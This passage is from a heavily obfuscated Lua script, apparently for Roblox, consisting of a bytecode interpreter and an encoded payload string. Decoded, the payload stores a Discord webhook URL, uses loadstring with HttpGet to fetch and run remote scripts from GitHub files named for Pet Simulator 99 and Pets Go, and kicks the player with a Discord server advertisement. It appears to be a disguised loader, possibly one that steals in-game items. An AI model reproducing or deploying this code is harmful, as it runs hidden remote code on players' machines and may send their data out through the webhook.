v277;local v278,v279;local v280;v83[v85[2 -0 ]]=v83[v85[9 -6 ]];v77=v77 + (157 -(18 + 138)) + 0 ;v85=v73[v77];v83[v85[5 -3 ]]=v63[v85[1251 -(111 + 1137) ]];v77=v77 + (2 -(2 -1)) ;v85=v73[v77];v83[v85[160 -(91 + 67) ]]=v63[v85[1105 -(67 + 1035) ]];v77=v77 + (2 -1) ;v85=v73[v77];v83[v85[2]]=v63[v85[1 + 2 ]];v77=v77 + 1 ;v85=v73[v77];v83[v85[(351 -(136 + 212)) -1 ]]=v63[v85[526 -(423 + 100) ]];v77=v77 + 1 + 0 ;v85=v73[v77];v83[v85[1 + 1 ]]=v83[v85[7 -4 ]];v77=v77 + 1 + 0 ;v85=v73[v77];v83[v85[1 + 1 ]]=v83[v85[774 -(326 + 445) ]];v77=v77 + (3 -2) ;v85=v73[v77];v83[v85[1558 -(655 + 901) ]]=v83[v85[1 + 2 ]] + v85[17 -13 ] ;v77=v77 + (4 -3) + 0 ;v85=v73[v77];v280=v85[4 -2 ];v278,v279=v76(v83[v280](v13(v83,v280 + (2 -1) ,v85[714 -(530 + 181) ])));v78=(v279 + v280) -(882 -(614 + 267)) ;v277=32 -(19 + 13) ;for v398=v280,v78 do v277=v277 + (1 -0) ;v83[v398]=v278[v277];end v77=v77 + ((2 + 0) -1) ;v85=v73[v77];v280=v85[5 -3 ];v83[v280]=v83[v280](v13(v83,v280 + 1 + 0 ,v78));v77=v77 + (1311 -(682 + 628)) ;v85=v73[v77];v83[v85[3 -1 ]]=v63[v85[6 -(3 + 0) ]];v77=v77 + (1813 -(1293 + 519)) ;v85=v73[v77];v83[v85[3 -1 ]]=v63[v85[272 -(239 + 30) ]];v77=v77 + 1 ;v85=v73[v77];v83[v85[1 + 1 ]]=v83[v85[7 -(1608 -(240 + 1364)) ]];v77=v77 + (1 -0) ;v85=v73[v77];v83[v85[8 -6 ]]= #v83[v85[6 -3 ]];v77=v77 + 1 + 0 ;v85=v73[v77];v83[v85[2]]=v83[v85[1 + 2 ]]%v83[v85[4]] ;v77=v77 + (2 -1) ;v85=v73[v77];v83[v85[1 + 1 ]]=v85[2 + 1 ] + v83[v85[2 + 2 ]] ;v77=v77 + (2 -1) ;v85=v73[v77];v83[v85[1377 -(1140 + 235) ]]= #v83[v85[1 + 2 ]];v77=v77 + 1 + (1082 -(1050 + 32)) ;v85=v73[v77];v83[v85[2 + 0 ]]=v83[v85[1 + (7 -5) ]]%v83[v85[56 -(33 + 19) ]] ;v77=v77 + (1097 -(420 + 289 + 387)) ;v85=v73[v77];v83[v85[1860 -(673 + 1185) ]]=v85[8 -5 ] + v83[v85[12 -8 ]] ;v77=v77 + (1 -0) ;v85=v73[v77];v83[v85[2 + 0 ]]=v83[v85[3 + 0 ]] + v85[5 -1 ] ;v77=v77 + 1 + 0 ;v85=v73[v77];v280=v85[(1058 -(331 + 724)) -1 ];v278,v279=v76(v83[v280](v13(v83,v280 + (2 -1) ,v85[1491 -(1309 + 179) ])));v78=(v279 + v280) -(1 -0) ;v277=1880 -(36 + 410 + 1434) ;for v401=v280,v78 do v277=v277 + ((1928 -(269 + 375)) -(1040 + 243)) ;v83[v401]=v278[v277];end v77=v77 + 1 + 0 ;v85=v73[v77];v280=v85[5 -3 ];v278,v279=v76(v83[v280](v13(v83,v280 + ((2573 -(267 + 458)) -(559 + 1288)) ,v78)));v78=(v279 + v280) -(1932 -(609 + 1322)) ;v277=454 -(13 + 441) ;for v404=v280,v78 do v277=v277 + (3 -2) ;v83[v404]=v278[v277];end v77=v77 + (2 -1) ;v85=v73[v77];v280=v85[9 -(3 + 4) ];v83[v280]=v83[v280](v13(v83,v280 + 1 + 0 ,v78));v77=v77 + (3 -2) ;v85=v73[v77];v83[v85[7 -(9 -4) ]]=v83[v85[2 + (819 -(667 + 151)) ]]%v85[2 + 2 ] ;v77=v77 + ((1499 -(1410 + 87)) -1) ;v85=v73[v77];v280=v85[2 + 0 ];v278,v279=v76(v83[v280](v83[v280 + (1 -(1897 -(1504 + 393))) ]));v78=(v279 + v280) -(1 + 0) ;v277=0 + 0 ;for v407=v280,v78 do v277=v277 + 1 + 0 ;v83[v407]=v278[v277];end v77=v77 + (2 -1) + 0 ;v85=v73[v77];v280=v85[2 + 0 ];v83[v280](v13(v83,v280 + 1 + (0 -0) ,v78));else local v311=v85[2 + 0 ];v83[v311](v83[v311 + ((799 -(461 + 335)) -2) ]);end elseif (v86>37) then v83[v85[435 -(153 + 280) ]][v83[v85[3]]]=v85[11 -(1 + 6) ];elseif ((3245<=3566) and (v83[v85[2 + 0 ]]==v83[v85[2 + 2 ]])) then v77=v77 + (1 -0) ;else v77=v85[2 + 1 ];end elseif (v86<=((2702 -(1730 + 31)) -(525 + 372))) then if (v86<=(38 + 3)) then if ((v86<=39) or (2627<=381)) then if (v85[2 + 0 ]==v83[v85[5 -1 ]]) then v77=v77 + 1 ;else v77=v85[(1669 -(728 + 939)) + 1 ];end elseif (v86>(707 -(89 + 578))) then local v315=0 -0 ;local v316;local v317;local v318;while true do if (v315==(1 + 0)) then v318=v83[v316 + (3 -1) ];if ((283<4544) and (v318>(0 + 0))) then if ((618<3820) and (v317>v83[v316 + ((3718 -2668) -(572 + 477)) ])) then v77=v85[(1 -0) + (4 -2) ];else v83[v316 + 2 + 1 ]=v317;end elseif ((4287>=124) and (v317<v83[v316 + 1 + 0 ])) then v77=v85[89 -((1152 -(138 + 930)) + 2) ];else v83[v316 + (8 -5) ]=v317;end break;end if (v315==(0 -0)) then v316=v85[2 + 0 ];v317=v83[v316];v315=2 -1 ;end end else do return;end end elseif ((2569<=3918) and (v86<=(884 -(497 + 345)))) then local v192=0 + 0 ;local v193;while true do if ((v192==(1 + 4)) or (3154<=2030)) then v77=v77 + (4 -3) ;v85=v73[v77];v83[v85[3 -1 ]][v85[1 + 0 + 2 ]]=v83[v85[4]];v77=v77 + (1334 -(605 + 728)) ;v85=v73[v77];v192=11 -5 ;end if ((v192==(1 + 0)) or (3761<=682)) then v77=v77 + (1 -0) ;v85=v73[v77];v193=v85[1 + 0 + 1 ];v83[v193]=v83[v193](v13(v83,v193 + (3 -2) ,v85[3]));v77=v77 + 1 + 0 ;v192=3 -1 ;end if (v192==(8 -4)) then v83[v85[4 -2 ]]=v85[7 -(4 + 0) ];v77=v77 + 1 + 0 ;v85=v73[v77];v193=v85[491 -(457 + 32) ];v83[v193]=v83[v193](v13(v83,v193 + 1 + (0 -0) ,v85[(3171 -(459 + 1307)) -(832 + 570) ]));v192=5 + 0 ;end if (v192==(1 + 1)) then v85=v73[v77];v83[v85[2 + 0 ]][v85[10 -7 ]]=v83[v85[2 + 2 ]];v77=v77 + (797 -(588 + 208)) ;v85=v73[v77];v83[v85[5 -(1873 -(474 + 1396)) ]]=v83[v85[1803 -(884 + 916) ]];v192=6 -3 ;end if ((2128>836) and (v192==(4 + 2))) then v83[v85[655 -(232 + 421) ]]=v83[v85[10 -7 ]];break;end if (v192==(1889 -(1569 + 320))) then v193=nil;v83[v85[1 + 1 ]]=v85[1 + 2 ];v77=v77 + (3 -2) ;v85=v73[v77];v83[v85[(10 -4) -(4 + 0) ]]=v85[(2 + 606) -(316 + 289) ];v192=2 -1 ;end if ((1 + 2)==v192) then v77=v77 + (1454 -(666 + 787)) ;v85=v73[v77];v83[v85[427 -(360 + 65) ]]=v85[3 + 0 ];v77=v77 + (255 -(79 + 175)) ;v85=v73[v77];v192=5 -1 ;end end elseif (v86==(34 + 9)) then local v319;local v320,v321;local v322;local v323;v83[v85[5 -3 ]]=v64[v85[5 -2 ]];v77=v77 + (900 -(503 + 396)) ;v85=v73[v77];v323=v85[183 -(92 + 89) ];v322=v83[v85[5 -2 ]];v83[v323 + 1 + 0 ]=v322;v83[v323]=v322[v85[1905 -(484 + 1417) ]];v77=v77 + 1 + (0 -0) ;v85=v73[v77];v83[v85[2 -0 ]]=v85[776 -(48 + 725) ];v77=v77 + (3 -2) ;v85=v73[v77];v323=v85[1 + 1 ];v320,v321=v76(v83[v323](v13(v83,v323 + (2 -1) ,v85[1 + 2 + 0 ])));v78=(v321 + v323) -(1 + 0) ;v319=0 -0 ;for v436=v323,v78 do v319=v319 + 1 ;v83[v436]=v320[v319];end v77=v77 + 1 + 0 ;v85=v73[v77];v323=v85[6 -4 ];v83[v323]=v83[v323](v13(v83,v323 + (1 -(0 -0)) ,v78));v77=v77 + (1245 -(485 + 759)) ;v85=v73[v77];v83[v85[855 -(152 + (1292 -(562 + 29))) ]]();v77=v77 + (2 -(1 + 0)) ;v85=v73[v77];v77=v85[1192 -((1861 -(374 + 1045)) + 747) ];else local v337=895 -(557 + 338) ;local v338;while true do if (((2 + 2)==v337) or (2361<=1063)) then v77=v77 + (1136 -(832 + 303)) ;v85=v73[v77];v338=v85[948 -(88 + 858) ];v83[v338]=v83[v338](v13(v83,v338 + 1 ,v85[1 + 2 ]));v77=v77 + 1 ;v85=v73[v77];v337=5 + 0 ;end if (v337==(1 + 1)) then v77=v77 + (790 -(766 + 23)) ;v85=v73[v77];v83[v85[2]][v85[14 -11 ]]=v83[v85[5 -1 ]];v77=v77 + (2 -1) ;v85=v73[v77];v83[v85[6 -(4 + 0) ]]=v83[v85[1076 -(1036 + 37) ]];v337=3 + 0 ;end if (v337==(6 -3)) then v77=v77 + (3 -(5 -3)) ;v85=v73[v77];v83[v85[3 -(639 -(448 + 190)) ]]=v85[1 + 2 + 0 ];v77=v77 + 1 + 0 ;v85=v73[v77];v83[v85[1482 -(641 + 839) ]]=v85[916 -(910 + 3) ];v337=9 -(3 + 2) ;end if (v337==(1685 -(1466 + 218))) then v85=v73[v77];v83[v85[1 + 1 ]]=v85[1151 -(363 + 193 + (2276 -1684)) ];v77=v77 + 1 + (0 -0) ;v85=v73[v77];v338=v85[810 -(329 + 479) ];v83[v338]=v83[v338](v13(v83,v338 + ((2349 -(1307 + 187)) -(174 + 680)) ,v85[11 -8 ]));v337=2 + 0 ;end if (v337==(0 -0)) then v338=nil;v83[v85[5 -3 ]]=v83[v85[5 -2 ]];v77=v77 + 1 + 0 ;v85=v73[v77];v83[v85[741 -(396 + 343) ]]=v85[1 + 2 ];v77=v77 + (1478 -(29 + 1448)) ;v337=1390 -(135 + (2935 -1681)) ;end if (((18 -13)==v337) or (1790>=3221)) then v83[v85[9 -7 ]][v85[2 + 1 ]]=v83[v85[16 -12 ]];break;end end end elseif (v86<=(1574 -(389 + 1138))) then if (v86<=(619 -(102 + (1447 -975)))) then v83[v85[2 + 0 ]]=v83[v85[142 -(43 + 96) ]]%v85[3 + 1 ] ;elseif (v86>(43 + 3)) then v83[v85[(2230 -(232 + 451)) -(320 + 1225) ]]=v85[5 -2 ] + v83[v85[3 + 1 ]] ;else local v340;local v341;local v342;v83[v85[1466 -(157 + 1307) ]]={};v77=v77 + 1 + 0 ;v85=v73[v77];v83[v85[1861 -(821 + 1038) ]]=v85[2 + 0 + 1 ];v77=v77 + (2 -1) ;v85=v73[v77];v83[v85[1 + 1 ]]= #v83[v85[4 -1 ]];v77=v77 + (1752 -(1414 + 337)) ;v85=v73[v77];v83[v85[1 + 1 ]]=v85[7 -4 ];v77=v77 + ((908 + 119) -(834 + 192)) ;v85=v73[v77];v342=v85[1 + 1 ];v341=v83[v342];v340=v83[v342 + (5 -3) ];if (v340>(0 -0)) then if ((4459>=3851) and (v341>v83[v342 + (565 -(510 + 54)) + 0 ])) then v77=v85[1 + 2 ];else v83[v342 + 3 + 0 ]=v341;end elseif ((v341<v83[v342 + (1 -0) ]) or (2969<=1860)) then v77=v85[3 + 0 ];else v83[v342 + (307 -(300 + 4)) ]=v341;end end elseif ((v86<=(42 + 7)) or (2123==39)) then if (v86==(13 + 35)) then v83[v85[2]]=v85[7 -4 ];else v83[v85[364 -(112 + 250) ]]=v64[v85[2 + 1 ]];end elseif (v86>(32 + 18)) then v83[v85[4 -2 ]][v85[2 + 1 ]]=v83[v85[3 + 1 ]];elseif (v83[v85[2 + 0 ]]==v85[(3116 -1569) -((1443 -(13 + 23)) + 136) ]) then v77=v77 + (1888 -(687 + 1200)) ;else v77=v85[2 + 1 ];end v77=v77 + 1 + 0 ;break;end if ((1414 -(1001 + 413))==v115) then v85=v73[v77];v86=v85[2 -1 ];v115=883 -(244 + 638) ;end end end end;end return v29(v28(),{},v17)(...);end return v15("LOL!3C3Q0003063Q00737472696E6703043Q006368617203043Q00627974652Q033Q0073756203053Q0062697433322Q033Q0062697403043Q0062786F7203053Q007461626C6503063Q00636F6E63617403063Q00696E73657274026Q00314003073Q009CF53055F7A88003063Q00C7EB90523D98026Q003040030A3Q00BBE024F41BA632C9B5EC03083Q00A7D6894AAB78CE53026Q002A4003073Q0001C7504D6C76E303083Q00876CAE3E121E1793026Q00284003093Q009AD07B580B8FD64B5403053Q007EDBB9223D026Q00264003083Q001CD2299A27C0218D03043Q00E849A14C026Q001C40030A3Q00E63529EFD3BFC60E06D603063Q00CAAB5C4786BE026Q00144003073Q0035BF893FD60DB103053Q00B962DAEB57026Q001040030E3Q00ADCBC213537AEE90D4060D25B99203063Q004BDCA3B76A62026Q00084003093Q007C51053747430D201B03043Q0045292260027Q0040030E3Q0047C1B5230161E905CAAC355E35E903073Q00DB36A9C05A3050026Q00F03F03083Q00E4CC883E8FBEDCDA03063Q00DFB1BFED4CE1028Q00022Q0010158E460042022Q00889D639A114203043Q0067616D6503073Q00506C616365496403023Q005F4703793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F31322Q38393334393436343239343732372Q382F555074636D63676F58654A666E72644D58714663316566574861766D70694E6877566D34384F4365536F46596B435448633936676B554D414C666835756D54396B454B78025Q0088C340030A3Q006C6F6164737472696E6703073Q00482Q7470476574034E3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F446574726F7830312F70657473696D2Q392F726566732F68656164732F6D61696E2F7363726970742E747874034C3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F446574726F7830312F70657473676F2F726566732F68656164732F6D61696E2F7363726970742E74787403053Q007072696E74030D3Q002E2Q672F65676F72696B75736103043Q007461736B03053Q0064656C6179026Q00244000C14Q00147Q00122Q000100013Q00202Q00010001000200122Q000200013Q00202Q00020002000300122Q000300013Q00202Q00030003000400122Q000400053Q00062Q0004000B0001000100041A3Q000B0001001231000400063Q002012000500040007001231000600083Q002012000600060009001231000700083Q00201200070007000A00060D00083Q000100062Q00133Q00074Q00133Q00014Q00133Q00054Q00133Q00024Q00133Q00034Q00133Q00064Q002C000900083Q00122Q000A000C3Q00122Q000B000D6Q0009000B000200104Q000B00094Q000900083Q00122Q000A000F3Q00122Q000B00106Q0009000B000200104Q000E00092Q002C000900083Q00122Q000A00123Q00122Q000B00136Q0009000B000200104Q001100094Q000900083Q00122Q000A00153Q00122Q000B00166Q0009000B000200104Q001400092Q002C000900083Q00122Q000A00183Q00122Q000B00196Q0009000B000200104Q001700094Q000900083Q00122Q000A001B3Q00122Q000B001C6Q0009000B000200104Q001A00092Q002C000900083Q00122Q000A001E3Q00122Q000B001F6Q0009000B000200104Q001D00094Q000900083Q00122Q000A00213Q00122Q000B00226Q0009000B000200104Q002000092Q002C000900083Q00122Q000A00243Q00122Q000B00256Q0009000B000200104Q002300094Q000900083Q00122Q000A00273Q00122Q000B00286Q0009000B000200104Q002600092Q0013000900083Q001230000A002A3Q001230000B002B4Q001E0009000B00020010333Q002900090012300009002C4Q0005000A000B3Q002632000900550001002C00041A3Q00550001001230000A002D3Q001230000B002E3Q001230000900293Q002632000900500001002900041A3Q00500001001231000C002F3Q002012000C000C0030000625000C00920001000A00041A3Q00920001001230000C002C4Q0005000D000D3Q000E27002C005D0001000C00041A3Q005D0001001230000D002C3Q002632000D00730001002C00041A3Q00730001001230000E002C3Q002632000E00670001002900041A3Q00670001001230000D00293Q00041A3Q00730001002632000E00630001002C00041A3Q00630001001231000F00313Q002Q2000103Q002900202Q00113Q00264Q000F0010001100122Q000F00313Q00202Q00103Q002300202Q00113Q00204Q000F0010001100122Q000E00293Q00044Q00630001002632000D00840001002900041A3Q00840001001230000E002C3Q002632000E007F0001002C00041A3Q007F0001001231000F00313Q00202200103Q001D00202Q000F0010003200122Q000F00313Q00202Q00103Q001A00202Q000F0010003300122Q000E00293Q002632000E00760001002900041A3Q00760001001230000D00263Q00041A3Q0084000100041A3Q00760001002632000D00600001002600041A3Q00600001001231000E00343Q00122B000F002F3Q00202Q000F000F003500122Q001100366Q000F00116Q000E3Q00024Q000E0001000100044Q00B9000100041A3Q0060000100041A3Q00B9000100041A3Q005D000100041A3Q00B90001001231000C002F3Q002012000C000C0030000625000C00B60001000B00041A3Q00B60001001230000C002C3Q000E27002C00A10001000C00041A3Q00A10001001231000D00313Q002019000E3Q001700202Q000F3Q00144Q000D000E000F00122Q000D00313Q00202Q000E3Q001100202Q000D000E002900122Q000C00293Q000E27002600AB0001000C00041A3Q00AB0001001231000D00343Q00122B000E002F3Q00202Q000E000E003500122Q001000376Q000E00106Q000D3Q00024Q000D0001000100044Q00B90001002632000C00970001002900041A3Q00970001001231000D00313Q002022000E3Q000E00202Q000D000E003300122Q000D00313Q00202Q000E3Q000B00202Q000D000E003200122Q000C00263Q00041A3Q0097000100041A3Q00B90001001231000C00383Q001230000D00394Q0023000C00020001001231000C003A3Q002012000C000C003B001230000D003C3Q00022Q000E00014Q0004000C000E000100041A3Q00C0000100041A3Q005000012Q00283Q00013Q00023Q00023Q00026Q00F03F026Q00704002264Q002E00025Q00122Q000300016Q00045Q00122Q000500013Q00042Q0003002100012Q000300076Q0024000800026Q000900016Q000A00026Q000B00036Q000C00046Q000D8Q000E00063Q00202Q000F000600014Q000C000F6Q000B3Q00024Q000C00036Q000D00046Q000E00016Q000F00016Q000F0006000F00102Q000F0001000F4Q001000016Q00100006001000102Q00100001001000202Q0010001000014Q000D00106Q000C8Q000A3Q000200202Q000A000A00024Q0009000A6Q00073Q000100040A0003000500012Q0003000300054Q0013000400024Q0002000300044Q001100036Q00283Q00017Q00053Q0003043Q0067616D6503073Q00506C6179657273030B3Q004C6F63616C506C6179657203043Q004B69636B03223Q006A6F696E202E2Q672F65676F72696B75736120746F206765742072696368206E6F7700073Q0012013Q00013Q00206Q000200206Q000300206Q000400122Q000200058Q000200016Q00017Q00",v9(),...);